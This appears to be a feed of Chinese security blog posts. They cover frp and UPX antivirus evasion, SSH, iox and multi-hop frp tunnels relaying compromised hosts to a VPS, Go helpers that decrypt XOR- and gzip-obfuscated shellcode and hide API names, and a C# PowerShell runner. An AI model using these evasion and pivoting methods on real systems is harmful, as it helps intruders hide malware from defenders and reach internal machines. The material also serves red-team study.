class="code"><pre><span class="line">upx -1 frpc_windows_amd64.exe</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210612162526869.png" alt="image-20210612162526869"></p><p>使用360检测，本文写于2021.6.12下午，此时frp还未被查杀，如果查杀根据我下面给出的思路，进行免杀。别上传云查杀了，要不然直接给你秒了。</p><ul><li>添加图片，添加无用资源。</li><li>变换upx压缩的级别</li><li>修改upx压缩特征</li></ul><p><img src="https://gitee.com/magisec/images/raw/master/image-20210612161341679.png" alt="image-20210612161341679"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有手就行，多捣鼓多做实验。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透之通信技术总结</title>
      <link href="2021/06/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93/"/>
      <url>2021/06/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="内网渗透之通信技术总结"><a href="#内网渗透之通信技术总结" class="headerlink" title="内网渗透之通信技术总结"></a>内网渗透之通信技术总结</h1><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>将目标机器的8080端口转发到127.0.0.1的8081端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 8081 -p 8080 -r 127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="Socks隧道"><a href="#Socks隧道" class="headerlink" title="Socks隧道"></a>Socks隧道</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br><span class="line">run auxiliary&#x2F;server&#x2F;socks_proxy</span><br></pre></td></tr></table></figure><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>参数说明</p><ul><li>-f 后台执行ssh指令</li><li>-C 压缩数据</li><li>-N 不执行远程指令</li><li>-R 将远程主机的某个端口转发到本机端指定机器的指定端口</li><li>-L 将本地机的某个端口转发到远程指定机器的指定端口</li><li>-p 指定远程主机的端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -fCNR [B机器IP或省略]:[B机器端口]:[A机器的IP]:[A机器端口] [登陆B机器的用户名@服务器IP]</span><br><span class="line">ssh -fCNL [A机器IP或省略]:[A机器端口]:[B机器的IP]:[B机器端口] [登陆B机器的用户名@B机器的IP]</span><br></pre></td></tr></table></figure><p>*为任何机子都能访问</p><h3 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h3><p>将目标10521端口转发到目标的1521端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 0.0.0.0:10521:127.0.0.1:1521 -fN user@10.0.0.1</span><br></pre></td></tr></table></figure><h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><p>将目标8080端口转发到本地的8081端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8081:localhost:8080 -fN user@10.0.0.1</span><br></pre></td></tr></table></figure><h3 id="Socks隧道-1"><a href="#Socks隧道-1" class="headerlink" title="Socks隧道"></a>Socks隧道</h3><p>在本地8888端口创建向10.0.0.1的socks5通道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfND 8888 user@10.0.0.1</span><br></pre></td></tr></table></figure><p>暗月前辈关于SSH隧道技术的文章：<a href="https://www.moonsec.com/archives/1274">https://www.moonsec.com/archives/1274</a></p><p><img src="https://www.moonsec.com/wp-content/uploads/2020/05/ssh.png"></p><h2 id="IOX"><a href="#IOX" class="headerlink" title="IOX"></a>IOX</h2><p>这款工具上手特别快，而且是GO开发的虽然体积稍微有点大，但是并不是问题。它的优势是简单易用，平台兼容好。</p><p>IOX：<a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p><ul><li>-l 本地端口</li><li>-r 连接远程的主机</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-l 127.0.0.1:9999      -l *127.0.0.1:9999      # 127.0.0.1:9999</span><br><span class="line">-l 9999                -l *9999                # 0.0.0.0:9999</span><br><span class="line"></span><br><span class="line">&#96;-l :9999&#96;也是可以的，但并不推荐。因为&#96;-l *:9999&#96;(监听0.0.0.0:9999，开启加密)会有歧义</span><br></pre></td></tr></table></figure><h3 id="端口转发-1"><a href="#端口转发-1" class="headerlink" title="端口转发"></a>端口转发</h3><p>监听 0.0.0.0:8888 和0.0.0.0:9999，将两个连接间的流量转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iox fwd -l 8888 -l 9999</span><br></pre></td></tr></table></figure><p>监听0.0.0.0:8888把流量转发到1.1.1.1:9999</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;iox fwd -l 8888 -r 1.1.1.1:9999</span><br></pre></td></tr></table></figure><p>连接1.1.1.1:8888和1.1.1.1:9999, 在两个连接间转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999</span><br></pre></td></tr></table></figure><h3 id="Socks代理"><a href="#Socks代理" class="headerlink" title="Socks代理"></a>Socks代理</h3><p>在本地 0.0.0.0:1080启动Socks5服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;iox proxy -l 1080</span><br></pre></td></tr></table></figure><p>在被控机开启Socks5服务，将服务转发到公网VPS。在VPS上转发0.0.0.0:9999到0.0.0.0:1080。你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;iox proxy -r 1.1.1.1:9999 &#x2F;&#x2F;被控机</span><br><span class="line">.&#x2F;iox proxy -l 9999 -l 1080 &#x2F;&#x2F;vps</span><br></pre></td></tr></table></figure><h3 id="启用加密"><a href="#启用加密" class="headerlink" title="启用加密"></a>启用加密</h3><p>注意：key必须是数字</p><p>被控机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565</span><br></pre></td></tr></table></figure><p>VPS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;iox fwd -l *8888 -l 33890 -k 656565</span><br></pre></td></tr></table></figure><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><h3 id="实战环境"><a href="#实战环境" class="headerlink" title="实战环境"></a>实战环境</h3><p>网络环境：</p><ul><li>Kali 192.168.20.131</li><li>Win10 192.168.20.134 192.168.58.128</li><li>Win7 192.168.58.129 192.168.18.128</li><li>Ser2008 192.168.18.129</li></ul><p>通信情况：</p><ol><li>kali通Win10</li><li>Win10通Win7和Kali</li><li>Win7通Win10和Ser2008</li><li>Ser2008通Win7</li></ol><h4 id="二层网络应用"><a href="#二层网络应用" class="headerlink" title="二层网络应用"></a>二层网络应用</h4><h5 id="端口转发-2"><a href="#端口转发-2" class="headerlink" title="端口转发"></a>端口转发</h5><p>frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.20.131</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 192.168.58.129       </span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 7001</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>转发192.168.58.129的3389端口到7001</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611135026482.png" alt="image-20210611135026482"></p><p>使用rdesktop连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:7001</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611135627893.png" alt="image-20210611135627893"></p><h5 id="Socks5隧道"><a href="#Socks5隧道" class="headerlink" title="Socks5隧道"></a>Socks5隧道</h5><p>frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.20.131</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[socks5_proxy]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 7002</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611135824324.png" alt="image-20210611135824324"></p><p>Kali配置Socks5代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611135906354.png" alt="image-20210611135906354"></p><p>使用proxychains代理rdesktop进行连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 192.168.58.129</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611140000353.png" alt="image-20210611140000353"></p><h4 id="三层网络应用"><a href="#三层网络应用" class="headerlink" title="三层网络应用"></a>三层网络应用</h4><h5 id="端口转发-3"><a href="#端口转发-3" class="headerlink" title="端口转发"></a>端口转发</h5><p>Win10启动frps</p><p>frps.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611143445928.png" alt="image-20210611143445928"></p><p>Win7使用frpc连接Win10，转发192.168.18.129的3389端口到192.168.58.128的7001端口</p><p>frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.58.128</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 192.168.18.129       </span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 7001</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611143711033.png" alt="image-20210611143711033"></p><p>Win10使用frpc连接Kali，将127.0.0.1的7001端口（192.168.18.129的3389端口）转发到Kali的7001端口</p><p>frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.20.131</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1      </span><br><span class="line">local_port &#x3D; 7001</span><br><span class="line">remote_port &#x3D; 7001</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611143801027.png" alt="image-20210611143801027"></p><p>使用rdesktop进行连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:7001</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611143832903.png" alt="image-20210611143832903"></p><h5 id="Socks5隧道-1"><a href="#Socks5隧道-1" class="headerlink" title="Socks5隧道"></a>Socks5隧道</h5><p>Win10启动frps</p><p>frps.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611145723699.png" alt="image-20210611145723699"></p><p>Win7连接Win10的frps，创建socks5代理转发至Win10的7002端口</p><p>frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.58.128</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[socks5_proxy]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 7002</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611145850477.png" alt="image-20210611145850477"></p><p>Win10连接Kali的frps，将127.0.0.1的7002端口转发至Kali的7001端口去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.20.131</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1      </span><br><span class="line">local_port &#x3D; 7002</span><br><span class="line">remote_port &#x3D; 7001</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611150015162.png" alt="image-20210611150015162"></p><p>Kali配置Socks5代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611150159097.png" alt="image-20210611150159097"></p><p>使用proxychains代理rdesktop进行连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 192.168.18.129</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611150103726.png" alt="image-20210611150103726"></p><h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><ul><li>iodine：<a href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a> DNS隧道</li><li>pingtunnel：<a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a> ICMP隧道</li><li>hanstunnel：<a href="https://github.com/albertzak/hanstunnel">https://github.com/albertzak/hanstunnel</a> ICMP隧道</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要总结FRP的使用，提了一下IOX。先说说iox，当时学内网渗透的时候有很多工具，使用参数难记。但是iox的这款工具特别适合新手，且教程相当详细，参数够简洁，我很喜欢使用这一款工具。FRP确实很不错，但是体积真的有点大。而且流量特征相当明显，后期我会进行对其进行改造。主要改造从 流量特征 体积 配置文件这三个方面入手。关于文章为什么不写其他的工具呢？招式太多，不如精通一两招就可以了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Golang获取进程数</title>
      <link href="2021/06/03/Golang%E8%8E%B7%E5%8F%96%E8%BF%9B%E7%A8%8B%E6%95%B0/"/>
      <url>2021/06/03/Golang%E8%8E%B7%E5%8F%96%E8%BF%9B%E7%A8%8B%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;syscall&quot;</span><br><span class="line">&quot;unsafe&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type ulong int32</span><br><span class="line">type ulong_ptr uintptr</span><br><span class="line"></span><br><span class="line">type PROCESSENTRY32 struct &#123;</span><br><span class="line">dwSize              ulong</span><br><span class="line">cntUsage            ulong</span><br><span class="line">th32ProcessID       ulong</span><br><span class="line">th32DefaultHeapID   ulong_ptr</span><br><span class="line">th32ModuleID        ulong</span><br><span class="line">cntThreads          ulong</span><br><span class="line">th32ParentProcessID ulong</span><br><span class="line">pcPriClassBase      ulong</span><br><span class="line">dwFlags             ulong</span><br><span class="line">szExeFile           [260]byte</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">kernel32 :&#x3D; syscall.NewLazyDLL(&quot;kernel32.dll&quot;)</span><br><span class="line">CreateToolhelp32Snapshot :&#x3D; kernel32.NewProc(&quot;CreateToolhelp32Snapshot&quot;)</span><br><span class="line">pHandle, _, _ :&#x3D; CreateToolhelp32Snapshot.Call(uintptr(0x2), uintptr(0x0))</span><br><span class="line">if int(pHandle) &#x3D;&#x3D; -1 &#123;</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">Process32Next :&#x3D; kernel32.NewProc(&quot;Process32Next&quot;)</span><br><span class="line">num :&#x3D; 0</span><br><span class="line">for &#123;</span><br><span class="line">var proc PROCESSENTRY32</span><br><span class="line">proc.dwSize &#x3D; ulong(unsafe.Sizeof(proc))</span><br><span class="line">if rt, _, _ :&#x3D; Process32Next.Call(uintptr(pHandle), uintptr(unsafe.Pointer(&amp;proc))); int(rt) &#x3D;&#x3D; 1 &#123;</span><br><span class="line">num++</span><br><span class="line">&#125; else &#123;</span><br><span class="line">break</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle :&#x3D; kernel32.NewProc(&quot;CloseHandle&quot;)</span><br><span class="line">_, _, _ &#x3D; CloseHandle.Call(pHandle)</span><br><span class="line">fmt.Println(num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Csharp运行powershell</title>
      <link href="2021/06/03/Csharp%E8%BF%90%E8%A1%8Cpowershell/"/>
      <url>2021/06/03/Csharp%E8%BF%90%E8%A1%8Cpowershell/</url>
      
        <content type="html"><![CDATA[<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">using System.Management.Automation.Runspaces;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Dmagic</span><br><span class="line">&#123;</span><br><span class="line">    static class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Runspace runspace;</span><br><span class="line">            runspace &#x3D; RunspaceFactory.CreateRunspace();</span><br><span class="line">            runspace.Open();</span><br><span class="line">            string script &#x3D; string.Join(&quot; &quot;, args);</span><br><span class="line">            Pipeline pipeline &#x3D; runspace.CreatePipeline();</span><br><span class="line">            pipeline.Commands.AddScript(script);</span><br><span class="line">            pipeline.Invoke();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Golang免杀Tips</title>
      <link href="2021/05/31/Golang%E5%85%8D%E6%9D%80Tips/"/>
      <url>2021/05/31/Golang%E5%85%8D%E6%9D%80Tips/</url>
      
        <content type="html"><![CDATA[<h1 id="Golang免杀Tips"><a href="#Golang免杀Tips" class="headerlink" title="Golang免杀Tips"></a>Golang免杀Tips</h1><p>上次更新一篇我自己开发的shellcode混淆工具的使用，这里给出基于Golang的解密方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;bytes&quot;</span><br><span class="line">&quot;compress&#x2F;gzip&quot;</span><br><span class="line">&quot;io&#x2F;ioutil&quot;</span><br><span class="line">&quot;syscall&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;基于str的xor混淆</span><br><span class="line">func xor_decrypt_Str(input string, key int) (output string) &#123;</span><br><span class="line">for i :&#x3D; 0; i &lt; len(input); i++ &#123;</span><br><span class="line">output +&#x3D; string(int(input[i]) ^ key)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return output</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;基于byte的xor混淆</span><br><span class="line">func xor_decrypt_Byte(input []byte, key int) (output []byte) &#123;</span><br><span class="line">output &#x3D; make([]byte, len(input))</span><br><span class="line">for i, _ :&#x3D; range input &#123;</span><br><span class="line">output[i] &#x3D; input[i] ^ byte(key)</span><br><span class="line">&#125;</span><br><span class="line">return output</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;gzip解压</span><br><span class="line">func decompress_Gzip(data []byte) []byte &#123;</span><br><span class="line">gr, _ :&#x3D; gzip.NewReader(bytes.NewBuffer(data))</span><br><span class="line">defer gr.Close()</span><br><span class="line">data, _ &#x3D; ioutil.ReadAll(gr)</span><br><span class="line">return data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;基于xor混淆的GetProcAddress</span><br><span class="line">func decrypt_GetProcAddress(module syscall.Handle, decryptname string, key int) (proc uintptr) &#123;</span><br><span class="line">procname :&#x3D; xor_decrypt_Str(decryptname, key)</span><br><span class="line">proc, _ &#x3D; syscall.GetProcAddress(module, procname)</span><br><span class="line">&#x2F;&#x2F;fmt.Println(procname, &quot;:&quot;, proc)</span><br><span class="line">return proc</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;基于xor混淆的LoadLibrary</span><br><span class="line">func decrypt_LoadLibrary(decryptname string, key int) (handle syscall.Handle) &#123;</span><br><span class="line">libname :&#x3D; xor_decrypt_Str(decryptname, key)</span><br><span class="line">handle, _ &#x3D; syscall.LoadLibrary(libname)</span><br><span class="line">&#x2F;&#x2F;fmt.Println(libname, &quot;:&quot;, handle)</span><br><span class="line">return handle</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>super-duper</title>
      <link href="2021/05/30/super-duper/"/>
      <url>2021/05/30/super-duper/</url>
      
        <content type="html"><![CDATA[<h1 id="super-duper"><a href="#super-duper" class="headerlink" title="super-duper"></a>super-duper</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>项目地址：<a href="https://github.com/magisec/super-duper">https://github.com/magisec/super-duper</a></p><p>使用混淆与加密规避查杀，基于Python3开发，无任何依赖。</p><h2 id="混淆函数"><a href="#混淆函数" class="headerlink" title="混淆函数"></a>混淆函数</h2><p>可用混淆函数列表：</p><ul><li>Confuse_uuid 使用uuid加密</li><li>Confuse_xor_str 对str进行xor混淆</li><li>Confuse_xor_file 对byte进行xor混淆</li><li>Confuse_gzip_xor 使用gzip压缩数据 &gt; Xor异或混淆 适用于体积较大的工具，效果相当不错。</li><li>Confuse_uuid_xor_gzip_hex 使用uuid加密 &gt; xor异或 &gt; gzip压缩 &gt; hex 进行混淆，效果很好，付出代价同样大，更适用于小体积的shellcode。</li></ul><h2 id="使用帮助"><a href="#使用帮助" class="headerlink" title="使用帮助"></a>使用帮助</h2><p>查看帮助</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python confuse_tools.py --help</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210530194450066.png" 